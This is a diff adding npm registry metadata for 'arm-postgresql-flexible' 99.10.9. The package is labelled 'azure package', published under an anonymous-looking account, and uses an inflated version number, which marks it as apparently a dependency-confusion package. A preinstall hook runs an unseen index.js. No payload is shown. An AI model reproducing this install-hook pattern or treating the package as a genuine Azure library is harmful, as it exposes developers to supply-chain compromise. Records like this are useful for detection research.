@@ -1,0 +1,62 @@
+{
+    "_id": "arm-postgresql-flexible",
+    "name": "arm-postgresql-flexible",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "arm-postgresql-flexible",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "arm-postgresql-flexible@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-KpneUrE/YIWuZkNHcLjue+qqt++ZdCS1e9PTpDAkrjR28RZsZJgEXDqL6vaVDqgHOm8QAxncvc9HEtM3pthRxw==",
+                "shasum": "8d3d1fb98a377e7ce294ef2e9af782d4e446b86a",
+                "tarball": "https://registry.npmjs.org/arm-postgresql-flexible/-/arm-postgresql-flexible-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5075,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiN01XACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmrrBA/+NDpBeGHjSjiHfy1m9EqR1OWmQxGU8DbR92Z4tunx/8vVFcDt\r\n+nluMHYqbDNAhahcKx2stXjyLqx/MYQ5ZKnvoHgTm0DqXSWNQJrJ/OWYws7r\r\ntyN2ZEB1Cr9zA32Vz3dEsZF0onUYxGHiS8Fuqqepn8NZ80xbQkkOliYeXDA/\r\nQ8LQBuIcr7vCCu3z5cvpEpxzV/9ebkTpdauW5dLWlFjjRTRe6gsbkEqjzrD/\r\nxxJpB7JG9kY1nmb0JNYNm8HvNntqUFnzbHJDl/nWKD/RXLnfai0qaysx2PDd\r\nh/VX+3H7lB1+9NAM6NuMzyYuijJDDL8TXe63/6y5dPOu7s+cINuT2DtLk9QB\r\nkV6DB3cGGp8uyaMZnoxl2vVwOqvkSZkPxRuQc0zOKyp/8rHdDMntWRwt6a3T\r\nnNHWmy0XBcZ+27FZg0w+WrUex1XNBTWhSCRm3KyiQxWrQwXmyT/7ZOybN+VL\r\nfog/n9uc9EGd+dL1i8mphygJsVPOtkf0Hb286lS2eCHh7BKWSG7Ty0MyIu/W\r\nUllWGYshdLmhyPB2BrqRl6EJ6tmdyUdySxC7i77pPsIF+Rk/Z9awXXyDZ3jY\r\noJ4jJcrwhrjOyAexNr7a9So8o71DCJZFCT7CPH7rJfQlOhB7Bu+DladwX4a7\r\nM1kM3MiRIiqC5xIFpHbUJBXbj7UtQU7I7l8=\r\n=xsou\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "tzvkknpu",
+                "email": "tzvkknpu@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "tzvkknpu",
+                    "email": "tzvkknpu@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/arm-postgresql-flexible_99.10.9_1647791447349_0.767702061368315"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-20T15:50:47.349Z",
+        "99.10.9": "2022-03-20T15:50:47.485Z",
+        "modified": "2022-03-20T15:50:47.589Z"
+    },
+    "maintainers": [
+        {
+            "name": "tzvkknpu",
+            "email": "tzvkknpu@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
